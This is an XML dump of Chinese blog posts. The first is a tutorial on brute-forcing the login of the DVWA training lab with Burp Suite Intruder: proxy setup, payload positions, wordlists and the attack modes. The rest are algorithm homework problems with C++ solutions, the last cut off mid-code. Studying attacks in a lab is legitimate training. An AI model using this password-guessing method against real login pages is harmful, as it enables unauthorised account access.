    <content type="text"><![CDATA[利用burpsuite暴力破解DVWA的Brute_Force。 一、配置burpsuite打开火狐浏览器，工具栏里找到preferences,找到network proxy,点击settings,填写如下配置 ![`KHUGAWJ8ZXHWWKAC``3S.png](https://i.loli.net/2019/10/22/dbGx16ywKJ32Y9t.png) 打开burpsuite,勾选代理即可 先关闭proxy里的intercept，先不拦截 二、寻找注入点先进入DVWA页面，安全等级设置位low,再进入暴力破解的页面 输入用户名 1admin 密码 1123 开启burp suite拦截，登陆 选中全部内容，右键发送给intruder 点clear清除全部变量，选中123，点add，添加变量 ![O@P_AL@_P1IU`E~MU5A7X_Q.png](https://i.loli.net/2019/10/22/Opm7XKfaS1otTZE.png) 在payloads里添加破解字典 ![0EA__K`9T_QD_WXGC7_1_@S.png](https://i.loli.net/2019/10/22/837G4kexKdzlRaS.png) 下面就可以攻击了 burp suite的攻击类型 第一种：Sniper标签 这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。 第二种：Battering ram – 这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中 第三种：Pitchfork – 这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量 第四种：Cluster bomb – 这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。 三、攻击选择sniper攻击方式，开始攻击 根据攻击结果的length来判断是否成功 攻击成功，密码为password 此法适用各个安全等级]]></content>
      <categories>
        <category>暴力破解</category>
      </categories>
      <tags>
        <tag>暴力破解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法实验（一）]]></title>
    <url>%2F2019%2F10%2F22%2F%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C1%2F</url>
    <content type="text"><![CDATA[算法实验一。 问题 A: 判断字符串是否是手机号码题目描述手机号码是一串数字，长度为11位，并且第一位必须是1，现在给出一个字符串，我们需要判断这个字符串是否符合手机格式。 输入多组测试数据。每组数据输入一个字符串。 输出若该字符串符合手机号码格式，输出1，否则输出0。 样例输入112345612345 样例输出11 提示代码1234567891011121314151617181920#include&lt;iostream&gt;#include&lt;string&gt;using namespace std;int main()&#123; string s; while(cin&gt;&gt;s) &#123; int b=1; if(s[0]!='1'||s.length()!=11) b=0; for(int i=0;i&lt;s.length();i++) &#123; if(s[i]&lt;'0'||s[i]&gt;'9') b=0; &#125; cout&lt;&lt;b&lt;&lt;endl; &#125; &#125; 问题 B: 内部收益率题目描述 输入 输出对于每组数据，输出仅一行，即项目的IRR，四舍五入保留小数点后两位。 样例输入123451-1 22-8 6 90 样例输出121.000.50 提示代码12345678910111213141516171819202122232425262728293031323334#include&lt;iostream&gt;#include&lt;iomanip&gt; using namespace std;int main()&#123; double cf[15]; int T; double l,r,s,f,m; while(cin&gt;&gt;T&amp;&amp;T!=0) &#123; for(int i=0;i&lt;=T;i++) &#123; cin&gt;&gt;cf[i]; &#125; l=-1.0; r=1e8; for(int i=0;i&lt;100;i++) &#123; s=0; f=1.0; m=(l+r)/2; for(int j=1;j&lt;=T;j++) &#123; f=f/(1.0+m); s=s+cf[j]*f; &#125; if(s+cf[0]&gt;0) l=m; else r=m; &#125; cout&lt;&lt;setprecision(2)&lt;&lt;std::fixed&lt;&lt;m&lt;&lt;endl; &#125;&#125; 问题 C: 跳台阶题目描述一只青蛙一次可以跳上1级台阶，也可以跳上2级。求该青蛙跳上一个n级的台阶总共有多少种跳法。 输入多组测试样例。每组测试样例包含一个整数n。(1&lt;=n&lt;=100) 输出每组测试样例输出一行，表示青蛙跳上n级台阶的跳法数量. 所得到的结果模1000000007 样例输入1234 样例输出1235 提示代码12345678910111213141516171819202122232425262728293031323334353637383940414243#include&lt;iostream&gt;using namespace std;long long m=1000000007;/*int f(int n)&#123; if(n&lt;=1) return 1; else return (f(n-1)%m+f(n-2)%m)%m;&#125;*/long long f(int n)&#123; long long f1=1; long long f2=2; long long t=0; if(n==1) &#123; return 1; &#125; else if(n==2) &#123; return 2; &#125; else &#123; for(int i=3;i&lt;=n;i++) &#123; t=((f1%m)+(f2%m))%m; f1=f2; f2=t; &#125; return t; &#125;&#125;int main()&#123; int n; while(cin&gt;&gt;n) &#123; cout&lt;&lt;f(n)&lt;&lt;endl; &#125;&#125; 问题 D: 奶牛的聚会题目描述农历新年马上就要到了，奶牛们计划举办一次聚会庆祝新年的到来。但是，奶牛们并不喜欢走太远的路，这会给他们的聚会带来消极情绪，当一头奶牛的消极指数为Wi，他参加聚会所需行走的距离为si，那么他就会给聚会带来Si3*Wi的消极情绪。所有奶牛所在位置都在一条直线上，已知所有奶牛的坐标和消极指数，求如何确定聚会地点，使得所有奶牛给聚会带来的消极情绪之和最小，输出消极情绪之和的最小值。 输入第一行包含一个整数 Ca(Ca&lt;=20) ，表示有 Ca 组测试数据。 对于每组测试数据：第一行包含一个整数n(1&lt;=n&lt;=50000) ，表示奶牛的数量。接下来 n 行每行包含两个浮点数Si和wi (-106&lt;=Si&lt;=106, 0&lt;Wi&lt;15)。 输出对于每组测试数据，输出 “Case #c: ans” ，其中c表示测试数据编号，ans表示消极情绪之和的最小值，结果四舍五入为一个整数。 样例输入1234567150.9 21.4 43.1 16.2 18.3 2 样例输出1Case #1: 300 提示代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include&lt;bits/stdc++.h&gt;using namespace std;typedef long long ll;int inf = 0x3f3f3f3f;int n;double w[500005];double s[500005];double f(double x)&#123; double sum=0; for(int i=0;i&lt;n;i++) &#123; double d=abs(s[i]-x); sum+=d*d*d*w[i]; &#125; return sum;&#125;int main()&#123; int Ca; double l,r; double e=1e-6; cin&gt;&gt;Ca; //double s[50005]; //int w[50005]; for(int k=1;k&lt;=Ca;k++) &#123; //int n; cin&gt;&gt;n; l=inf; r=-inf; for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;s[i]; cin&gt;&gt;w[i]; l=min(l,s[i]); r=max(r,s[i]); &#125; while(r-l&gt;e) &#123; double m1=(l+r)/2; double m2=(m1+r)/2; if(f(m1)&gt;f(m2)) l=m1; else r=m2; &#125; cout&lt;&lt;"Case #"&lt;&lt;k&lt;&lt;": "&lt;&lt;ll(f(l)+0.5)&lt;&lt;endl; &#125;&#125; 问题 E: 光合作用题目描述蒜头是个爱学习的孩子，他总喜欢在生活中做一些小实验，这次蒜头想研究一下光合作用。蒜头的实验材料有如下几样：神奇的种子，普通的纸箱和一些光源。一开始，蒜头将种子均匀的种在了箱子底部，你可以将其看成 X 轴，种子的位置为 X 轴上的点。然后蒜头用纸板将箱子盖住，并在纸板上安装了一些光源（具体见图，顶上的为光源，光源两边与顶部的夹角都为45度，黄色部分为光照，绿色的为植物。）。神奇的种子会在有光的情况下一直向上生长直到没光为止。现在蒜头想知道当实验结束时每颗种子的高度是多少？ 输入第一行输入一个整数 T，表示测试数据的组数。 每组数据的第一行是三个整数 n,m,h(1&lt;=n,m&lt;=1e5,0&lt;=m&lt;=1e5,1&lt;=h&lt;=1e4),n表示种子数(编号为1,2…n)，m表示光源数,h 表示箱子的高度。 接下来m行，每行一个整数Xi表示第i个光源在顶部的位置。 输出对于每组测试数据，请输出n行，每行一个数表示第i颗种子的最终高度。 样例输入1234567827 1 244 4 11234 样例输出123456789101100121001111 提示这题后来进行了几次重测，请同学们不要惊慌 代码12345678910111213141516171819202122232425262728293031#include&lt;iostream&gt;#include&lt;cmath&gt;using namespace std;int main()&#123; int T; int mo[100005]; cin&gt;&gt;T; while(T--) &#123; int n,m,h; cin&gt;&gt;n&gt;&gt;m&gt;&gt;h; for(int i=1;i&lt;=m;i++) &#123; cin&gt;&gt;mo[i]; &#125; for(int i=1;i&lt;=n;i++) &#123; int min=1e5; for(int j=1;j&lt;=m;j++) &#123; if(abs(mo[j]-i)&lt;min) min=abs(mo[j]-i); &#125; if((h-min)&lt;=0) cout&lt;&lt;0&lt;&lt;endl; else cout&lt;&lt;(h-min)&lt;&lt;endl; &#125; &#125;&#125;]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法作业（二）]]></title>
    <url>%2F2019%2F10%2F21%2F%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A2%2F</url>
    <content type="text"><![CDATA[算法作业二。 问题 A: 单词排序题目描述小红学会了很多英文单词，妈妈为了帮小红加强记忆，拿出纸、笔，把 N 个单词写在纸上的一行里，小红看了几秒钟后，将这张纸扣在桌子上。妈妈问小红：“你能否将这 N 个单词按照字典排列的顺序，从小到大写出来？”小红按照妈妈的要求写出了答案。现在请你编写程序帮助妈妈检查小红的答案是否正确。注意：所有单词都由小写字母组成，单词两两之间用一个空格分隔。 输入输入包含两行。 第一行仅包括一个正整数N(0&lt;N≤26)。 第二行包含N个单词，表示妈妈写出的单词，两两之间用一个空格分隔。 单个单词长度不超过1010。 输出输出仅有一行。针对妈妈写出的单词，按照字典排列的顺序从小到大排列成一行的结果，每个单词后带一个空格。 样例输入124city boy tree student 样例输出1boy city student tree 提示代码12345678910111213141516171819202122#include&lt;bits/stdc++.h&gt;using namespace std;int main()&#123; string s[30]; int n; cin&gt;&gt;n; for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;s[i]; &#125; sort(s,s+n); for(int i=0;i&lt;n;i++) &#123; if(i==0) cout&lt;&lt;s[i]; else cout&lt;&lt;" "&lt;&lt;s[i]; &#125; cout&lt;&lt;endl; return 0;&#125; 问题 B: 求数组的最长递减子序列题目描述给定一个整数序列，输出它的最长递减（注意不是“不递增”）子序列。 输入输入包括两行，第一行包括一个正整数N（N&lt;=1000），表示输入的整数序列的长度。第二行包括用空格分隔开的N个整数，整数范围区间为[-30000,30000]。 输出输出最长递减子序列，数字之间有一个空格。 样例输入1289 4 3 2 5 4 3 2 样例输出19 5 4 3 2 提示代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include&lt;bits/stdc++.h&gt;using namespace std;int main()&#123; int n; int a[1010],b[1010],p[1010]; cin&gt;&gt;n; for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;a[i]; &#125; memset(b,1,sizeof(b)); memset(p,-1,sizeof(p)); for(int i=1;i&lt;n;i++) &#123; for(int j=0;j&lt;i;j++) &#123; if(a[i]&lt;a[j]&amp;&amp;(b[j]+1)&gt;b[i]) &#123; b[i]=b[j]+1; p[i]=j; &#125; &#125; &#125; int maxn=0,num=0; for(int i=0;i&lt;n;i++) &#123; if(b[i]&gt;maxn) &#123; maxn=b[i]; num=i; &#125; &#125; stack &lt;int&gt;stk; stk.push(a[num]); while(p[num]!=-1) &#123; stk.push(a[p[num]]); num=p[num]; &#125; while(!stk.empty()) &#123; cout&lt;&lt;stk.top()&lt;&lt;" "; stk.pop(); &#125; return 0;&#125; 问题 C: 矩形滑雪场题目描述zcb喜欢滑雪。他来到了一个滑雪场，这个滑雪场是一个矩形，为了简便，我们用r行c列的矩阵来表示每块地形。为了得到更快的速度，滑行的路线必须向下倾斜。 例如样例中的那个矩形，可以从某个点滑向上下左右四个相邻的点之一。例如24-17-16-1，其实25-24-23…3-2-1更长，事实上这是最长的一条。 输入第1行:两个数字r，c(1 ≤ r, c ≤ 100)，表示矩阵的行列。第2..r+1行:每行c个数，表示这个矩阵。 输出仅一行:输出1个整数，表示可以滑行的最大长度。 样例输入1234565 51 2 3 4 516 17 18 19 615 24 25 20 714 23 22 21 813 12 11 10 9 样例输出125 提示代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include&lt;bits/stdc++.h&gt;using namespace std;int m,n;int dp[40400]; struct node&#123; int h,x,y;&#125;ai[40040]; bool compare(node a,node b)&#123; return a.h&lt;b.h;&#125;bool check(node a,node b)&#123; if(((a.x==b.x&amp;&amp;abs(a.y-b.y)==1)||(a.y==b.y&amp;&amp;abs(a.x-b.x)==1))&amp;&amp;b.h&gt;a.h) return true; return false;&#125; int main()&#123; int num=0; cin&gt;&gt;m&gt;&gt;n; for(int i=1;i&lt;=m;i++) &#123; for(int j=1;j&lt;=n;j++) &#123; cin&gt;&gt;ai[num].h; ai[num].x=i; ai[num].y=j; num++; &#125; &#125; sort(ai,ai+m*n,compare); int mmax=1; for(int i=0;i&lt;num;i++) &#123; dp[i]=1; for(int j=0;j&lt;i;j++) &#123; if(check(ai[j],ai[i])) &#123; dp[i]=max(dp[i],dp[j]+1); &#125; &#125; if(dp[i]&gt;mmax) mmax=dp[i]; &#125; cout&lt;&lt;mmax&lt;&lt;endl; return 0;&#125; 问题 D: Homework题目描述临近开学了，大家都忙着收拾行李准 备返校，但 I_Love_C 却不为此担心! 因为他的心思全在暑假作业上：目前为止还未开动。 暑假作业是很多张试卷，我们这些从试卷里爬出来的人都知道，卷子上的题目有选择题、填空题、简答题、证明题等。而做选择题的好处就在于工作量很少，但又因为选择题题目都普遍很长。如果有 5 张试卷，其中 4 张是选择题，最后一张是填空题，很明显做最后一张所花的时间要比前 4 张长很多。但如果你只做了选择题，虽然工作量很少，但表面上看起来也已经做了4/5的作业了。 I_Love_C决定就用这样的方法来蒙混过关，他统计出了做完每一张试卷所需的时间以及它做完后能得到的价值（按上面的原理，选择题越多价值当然就越高咯）。 现在就请你帮他安排一下，用他仅剩的一点时间来做最有价值的作业。 输入测试数据包括多组。每组测试数据以两个整数 M,N(1&lt;M&lt;20,1&lt;N&lt;10000) 开头，分别表示试卷的数目和 I_Love_C 剩下的时间。接下来有 M 行，每行包括两个整数 T,V(1&lt;T&lt;N,1&lt;V&lt;10000)分别表示做完这张试卷所需的时间以及做完后能得到的价值，输入以 0 0 结束。 输出对应每组测试数据输出 I_Love_C 能获得的最大价值。保留小数点 2 位 提示：float 的精度可能不够，你应该使用 double 类型。 样例输入1234564 204 105 2210 31 20 0 样例输出137.00 提示代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include&lt;bits/stdc++.h&gt;using namespace std;int main()&#123; int m,n; int a[20],b[20]; double ma[20]; while(cin&gt;&gt;m&gt;&gt;n&amp;&amp;m!=0&amp;&amp;n!=0) &#123; double maxn=0; for(int i=0;i&lt;m;i++) &#123; cin&gt;&gt;a[i]; cin&gt;&gt;b[i]; ma[i]=double(b[i])/a[i]; &#125; int f=0; int s; double vm; while(1) &#123; if(f==m) break; vm=0; for(int i=0;i&lt;m;i++) &#123; if(ma[i]&gt;vm) &#123; vm=ma[i]; s=i; &#125; &#125; if(n&lt;a[s]) &#123; maxn=maxn+n*ma[s]; break; &#125; else &#123; maxn=maxn+b[s]; n=n-a[s]; ma[s]=0; f++; &#125; &#125; cout&lt;&lt;setprecision(2)&lt;&lt;std::fixed&lt;&lt;maxn&lt;&lt;endl; &#125;&#125; 问题 E: 区间包含问题题目描述已知 n 个左闭右开区间 [a,b)，对其进行 m 次询问，求区间[l,r]最多可以包含 n 个区间中的多少个区间，并且被包含的所有区间都不相交。 输入输入包含多组测试数据，对于每组测试数据： 第一行包含两个整数 n ,m (1≤n≤100000,1≤m≤100) 。 接下来 n 行每行包含两个整数 a ,b (0≤a&lt;b≤10^9) 。 接下来 m 行每行包含两个整数 l ,r (0≤l&lt;r≤10^9) 。 输出对于每组测试数据，输出 m 行，每行包含一个整数。 数据过大请使用快速输入输出。 样例输入123456784 31 32 41 41 21 21 31 4 样例输出123112 提示代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include&lt;iostream&gt;#include&lt;algorithm&gt;#define inf 0x7fffffffusing namespace std; typedef struct node&#123; int l; int r;&#125;node;bool cmp(node a, node b)&#123; return a.r &lt; b.r;&#125; int main()&#123; std::ios::sync_with_stdio(false); int n, m; while (cin &gt;&gt; n &gt;&gt; m) &#123; node *nnum = new node[n]; node *mnum = new node[m]; for (int i = 0; i &lt; n; i++) &#123; cin &gt;&gt; nnum[i].l &gt;&gt; nnum[i].r; &#125; for (int i = 0; i &lt; m; i++) &#123; cin &gt;&gt; mnum[i].l &gt;&gt; mnum[i].r; &#125; sort(nnum, nnum + n, cmp); for (int i = 0; i &lt; m; i++) &#123; int res = 0; int k = mnum[i].l; //K初始的时候等于m数组的左边界 for (int j = 0; j &lt; n; j++) &#123; if ((nnum[j].l &gt;= k)) &#123; if (nnum[j].r &lt;= mnum[i].r) &#123; res++; k = nnum[j].r; //每次更新成n数组的右边界 &#125; else //右边界一旦超过，直接扔掉后面的部分结束质询 &#123; break; &#125; &#125; &#125; cout &lt;&lt; res &lt;&lt; endl; &#125; delete[] nnum; delete[] mnum; &#125;&#125; 问题 F: 最长子序列题目描述在一个数组中找出和最大的连续几个数。（至少包含一个数） 例如： 数组A[] = [-2,1,-3,4,-1,2,1,-5,4]，则连续的子序列[4,-1,2,1]有最大的和6. 输入第一行输入一个不超过1000的整数n。 第二行输入n个整数A[i]。 输出输出一个整数，表示最大的和。 样例输入1231 1 -2 样例输出12 提示代码123456789101112131415161718192021222324252627#include&lt;bits/stdc++.h&gt;using namespace std;int main()&#123; int n; int a[1010],b[1010]; cin&gt;&gt;n; for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;a[i]; &#125; memset(b,0,sizeof(b)); b[0]=a[0]; int sum=0; for(int i=1;i&lt;n;i++) &#123; b[i]=max(b[i-1]+a[i],a[i]); &#125; for(int i=0;i&lt;n;i++) &#123; if(b[i]&gt;sum) &#123; sum=b[i]; &#125; &#125; cout&lt;&lt;sum&lt;&lt;endl;&#125; 问题 G: 元素整除问题题目描述输入20个整数，输出其中能被数组中其它元素整除的那些数组元素。 输入输入20个整数 输出按输入顺序输出符合要求的数字，每行输出一个整数。 样例输入12 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 样例输出12345678910111246891012141516182021 提示代码123456789101112131415161718192021222324252627282930#include&lt;bits/stdc++.h&gt;using namespace std;int main()&#123; int a[20],b[20]; for(int i=0;i&lt;20;i++) &#123; cin&gt;&gt;a[i]; b[i]=a[i]; &#125; sort(b,b+20); for(int i=0;i&lt;20;i++) &#123; //cout&lt;&lt;b[i]&lt;" "; int sign=0; for(int j=0;j&lt;20;j++) &#123; if(b[j]&lt;a[i]) &#123; if(a[i]%b[j]==0) sign=1; &#125; else break; &#125; if(sign==1) cout&lt;&lt;a[i]&lt;&lt;endl; &#125; return 0;&#125; 问题 H: 渊子赛马题目描述赛马是一古老的游戏，早在公元前四世纪的中国，处在诸侯割据的状态，历史上称为“战国时期”。在魏国作官的孙膑，因为受到同僚庞涓的迫害，被齐国使臣救出后，到达齐国国都。 赛马是当时最受齐国贵族欢迎的娱乐项目。上至国王，下到大臣，常常以赛马取乐，并以重金赌输赢。田忌多次与国王及其他大臣赌输赢，屡赌屡输。一天他赛马又输了，回家后闷闷不乐。孙膑安慰他说：“下次有机会带我到马场看看，也许我能帮你。” 孙膑仔细观察后发现，田忌的马和其他人的马相差并不远，只是策略运用不当，以致失败。 比赛前田忌按照孙膑的主意，用上等马鞍将下等马装饰起来，冒充上等马，与齐王的上等马比赛。第二场比赛，还是按照孙膑的安排，田忌用自己的上等马与国王的中等马比赛，在一片喝彩中，只见田忌的马竟然冲到齐王的马前面，赢了第二场。关键的第三场，田忌的中等马和国王的下等马比赛，田忌的马又一次冲到国王的马前面，结果二比一，田忌赢了国王。 就是这么简单，现在渊子也来赛一赛马。假设每匹马都有恒定的速度，所以速度大的马一定比速度小的马先到终点（没有意外！！）。不允许出现平局。最后谁赢的场数多于一半(不包括一半)，谁就是赢家(可能没有赢家)。渊子有 N(1&lt;=n&lt;=1000)匹马参加比赛。对手的马的数量与渊子马的数量一样，并且知道所有的马的速度。聪明的你来预测一下这场世纪之战的结果，看看渊子能否赢得比赛。 输入输入有多组测试数据。 每组测试数据包括 3 行： 第一行输入 N。表示马的数量。 第二行有 N 个整型数字，即渊子的 N 匹马的速度。 第三行有 N 个整型数字，即对手的 N 匹马的速度。 当 N 为 0 时退出。 输出若通过聪明的你精心安排，如果渊子能赢得比赛，那么输出YES。 否则输出NO。 样例输入123456752 3 3 4 51 2 3 4 542 2 1 22 2 3 10 样例输出12YESNO 提示代码123456789101112131415161718192021222324252627282930313233343536373839404142#include&lt;bits/stdc++.h&gt;using namespace std;int main()&#123; int n; while(cin&gt;&gt;n&amp;&amp;n!=0) &#123; int a[n],b[n]; for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;a[i]; &#125; for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;b[i]; &#125; sort(a,a+n); sort(b,b+n); int sum=0; for(int i=0;i&lt;n;i++) &#123; for(int j=0;j&lt;n;j++) &#123; if(b[i]&lt;a[j]) &#123; sum++; a[j]=0; break; &#125; &#125; &#125; if(sum&gt;=n/2+1) &#123; cout&lt;&lt;"YES"&lt;&lt;endl; &#125; else &#123; cout&lt;&lt;"NO"&lt;&lt;endl; &#125; &#125; return 0;&#125; 问题 I: 最长上升子序列题目描述给定一个长度为n的字符串S（只包含小写字母），给出q次查询，对于每次查询x，求出以S[x]（下标从0开始）为起始的最长上升子序列的长度（严格增）。 输入第一行两个整数n,q(1&lt;=n,q&lt;=1e5)，意义见题目描述。 第二行一个长度为n的字符串S。 第三行q个整数x(0&lt;=x&lt;n)，表示q次查询。 输出输出q个数（以空格分割，行末有空格），表示以S[x]为起始的最长上升子序列的长度。 样例输入12310 3abbaaccbbd2 5 8 样例输出13 2 2 提示代码123456789101112131415161718192021222324#include&lt;bits/stdc++.h&gt;#define max(a,b) ((a)&gt;(b)?(a):(b))using namespace std;int n,q;char a[100010];int ans[100010],p[30];int main()&#123; cin&gt;&gt;n&gt;&gt;q; cin&gt;&gt;a; for(int i=n-1;i&gt;=0;i--) &#123; ans[i]=1; for(int j=a[i]-'a'+1;j&lt;26;j++) ans[i]=max(ans[i],p[j]+1); p[a[i]-'a']=ans[i]; &#125; int x; while(q--) &#123; cin&gt;&gt;x; cout&lt;&lt;ans[x]&lt;&lt;" "; &#125;&#125; 问题 J: 区间第k小题目描述花花上算法课又偷偷摸鱼。她今天刚学会如何求解区间第k小的数，但是感觉没什么意思。于是她将题目稍稍改动了一下：对于一个长度为n的数列a来说，一共有n*(n+1)/2个子区间，对于数列a的每一个子区间，如果这个子区间的长度小于k，我们不管它，否则把该子区间的第k小的数加入新数列b（初始为空）。花花并不关心数列b里面的元素是什么，她只想知道新数列b中第k小的元素是多少。 例如，一个长度为4的数列a={5,3,4,9}，当k取3时只有三个子区间长度是&gt;=3的：{5,3,4},{3,4,9}和{5,3,4,9}。分别提取各自的第3小的数加入b数列得到{5,9,5},其中第3小的数为9。 输入第一行两个数n，k（1&lt;=n, k&lt;=1e5)意义见题目描述 第二行n个数表示数列a中的元素ai。(1&lt;=ai&lt;=1e9) 数据保证数列b中的元素个数不少于k个 输出输出一个数，表示数列b中的第k小的数 样例输入124 35 3 4 9 样例输出19 提示二分 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include&lt;bits/stdc++.h&gt;using namespace std;const int N = 100005;int a[N];int n, k;long long max_position(int x)&#123; long long result = 0; int l = 0, r = -1, num = 0; while (r &lt; n) &#123; if (num &lt; k) &#123; if (a[r + 1] &lt;= x)num++; r++; &#125; else &#123; result += n - r; if (a[l] &lt;= x)num--; l++; &#125; &#125; return result;&#125;int main()&#123; cin &gt;&gt; n &gt;&gt; k; int*b=new int[n]; for (int i = 0; i &lt; n; i++) &#123; cin &gt;&gt; a[i]; b[i] = a[i]; &#125; sort(b, b + n); int len = unique(b, b + n) - b; int l = 0, r = len - 1; int ans = 0; while (l &lt;= r) &#123; int mid = (l + r) / 2; long long ret = max_position(b[mid]); if (ret &gt;= k) &#123; ans = b[mid]; r = mid - 1; &#125; else l = mid + 1; &#125; cout &lt;&lt; ans; return 0;&#125;]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法作业（一）]]></title>
    <url>%2F2019%2F10%2F20%2F%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A1%2F</url>
    <content type="text"><![CDATA[算法作业一。 问题 A: 小雏鸟的成人式 2题目描述陶行知先生说：“我们要活的书，不要死的书 ”。 小雏鸟们从书上都是对的到现在能去伪存真的去使用书籍，证明你们长大了。总之就是要有自己的主见，自己的思考。 大白希望大家都能拿到一百分，所以对100这个数以及他的倍数很喜欢。 大白发现，从1开始，一定能找出一个序列从小到大排列，使得每一项都是 恰好能且仅能 被100整除D次。 请你编写程序，找到这个数列里第N个数。 输入 多行。每行输入两个整数，表示D和N，N范围[1,100]，D范围[0,2] 输出 每行对应输入，给出一个符合题意的整数 样例输入1230 51 112 85 样例输出12351100850000 提示代码1234567891011121314151617#include&lt;iostream&gt;#include&lt;cmath&gt;using namespace std; int main()&#123; int d,n; while(cin&gt;&gt;d&gt;&gt;n) &#123; if(n&gt;=1&amp;&amp;n&lt;100&amp;&amp;d&gt;=0&amp;&amp;d&lt;=2) cout&lt;&lt;n*int(pow(100,d))&lt;&lt;endl; else if(n==100) cout&lt;&lt;101*int(pow(100,d))&lt;&lt;endl; else continue; &#125; &#125; 问题 B: 小雏鸟的成人式 3题目描述陶行知先生说：“因为道德是做人的根本。根本一坏，纵然使你有一些学问和本领，也无甚用处。” 小雏鸟们需要时刻铭记在心，不管你长成什么样的的攻城狮，都必须三观正确。 涛涛轰这一天带着爱美酱来到了一个风景如画的地方游玩。艳阳高照，他俩玩的很尽兴，但是现在他们口渴了。 涛涛轰：“我要买饮料！” 店主：“我们这里有三种饮料，矿泉水1.5元一瓶，可乐2元一瓶，橙汁3.5元一瓶。” 涛涛轰：“好的，给我一瓶矿泉水。” 说完他掏出一张N元的大钞递给店主。 店主：“我忘了提醒你了，我们这里没有找客人钱的习惯的，多的钱我们都当小费收了的，嘿嘿。” 涛涛轰：“……” 涛涛轰环顾四周，就这一家商店，况且实在太渴了，看着脸热的粉扑扑的一头汗的爱美酱，就决定在这买了。不过涛涛轰想，与其把钱当小费送给他还不如自己多买一点饮料，反正早晚都要喝，但是要尽量少让他赚小费。 现在涛涛轰希望你能帮他计算一下，最少他要给店主多少小费。 输入输入数据的第一行是一个整数T(1&lt;=T&lt;=100)，代表测试数据的数量。然后是T行测试数据，每个测试数据只包含一个正整数N（1&lt;=N&lt;=10000），N代表小明手中钞票的面值，以分为单位。注意：商店里只有题中描述的三种饮料。 输出对于每组测试数据，请你输出小明最少要浪费多少钱给店主作为小费，以分为单位。 样例输入1232900250 样例输出12050 提示代码12345678910111213141516171819202122#include&lt;iostream&gt;#include&lt;cmath&gt;using namespace std;void test(int x)&#123; if(x&lt;150) cout&lt;&lt;x&lt;&lt;endl; else if(x&lt;=200||x&gt;300) cout&lt;&lt;(x%50)&lt;&lt;endl; else cout&lt;&lt;x-200&lt;&lt;endl;&#125;int main()&#123; int n,x; cin&gt;&gt;n; while(n--) &#123; cin&gt;&gt;x; test(x); &#125;&#125; 问题 C: 大白just大白题目描述大家都知道，大白对学术要求是很严格的。抄作业、考试作弊神马的在大白这简直不能忍。 这不刚刚过去的期末考试。有n个学生被查出来有问题。 大白给了他们申辩的机会，每个学生可以提交一段文字，作为申辩理由。但是大白发现来的人总会有一些奇怪的理由。 大白提前列了m个常见借口关键字。他想看看来申辩的学生中最烂的申辩理由是什么。 所谓最烂申辩理由就是，申辩里，含有常见借口关键字最多的。 含有关键字，指的是，理由中出现了一串和关键字完全匹配的字符串，如果出现大写小写不同，也认为匹配。比如，关键字是 bed 理由中出现Bedroom算含有一个关键字。 输入一个输入可能有多个case，每个case第一行两个数。分别代表n 和 m 接下来m行，每行一个关键字（字符串） 再接下来n行字符串。m和n都不大于20 每一个借口和借口关键字只会包含大小写字母，长度不会超过4000个字符。 输出对于每个case输出一行字符串，表示最烂的理由。若有多个理由包含相同数目的关键字，按输入顺序输出靠前的那个。 样例输入12345678910112 3lovecumtACMILoveCUMTACMcumtAACM2 2AbAbbA 样例输出12ILoveCUMTACMAb 提示代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include&lt;iostream&gt;#include&lt;string&gt;#include&lt;string.h&gt;#include &lt;algorithm&gt;using std::string;using namespace std;bool search(string str,string sub)&#123; int i; if((i = str.find(sub, i)) != std::string::npos) return true; else return false;&#125; int main()&#123; int m,n,k=0,local=0; while(cin&gt;&gt;n&gt;&gt;m) &#123; string key[m],ca[n],key1[m],ca1[n]; for(int i=0;i&lt;m;i++) &#123; cin&gt;&gt;key[i]; key1[i]=key[i]; transform(key1[i].begin(),key1[i].end(),key1[i].begin(),::tolower); &#125; for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;ca[i]; ca1[i]=ca[i]; transform(ca1[i].begin(),ca1[i].end(),ca1[i].begin(),::tolower); &#125; for(int i=0;i&lt;n;i++) &#123; int num=0; for(int j=0;j&lt;m;j++) &#123; if(search(ca1[i],key1[j])) num++; //cout&lt;&lt;search(ca1[i],key1[j])&lt;&lt;endl; &#125; if(num&gt;k) &#123; k=num; local=i; &#125; &#125; //cout&lt;&lt;local&lt;&lt;endl; //cout&lt;&lt;k&lt;&lt;endl; 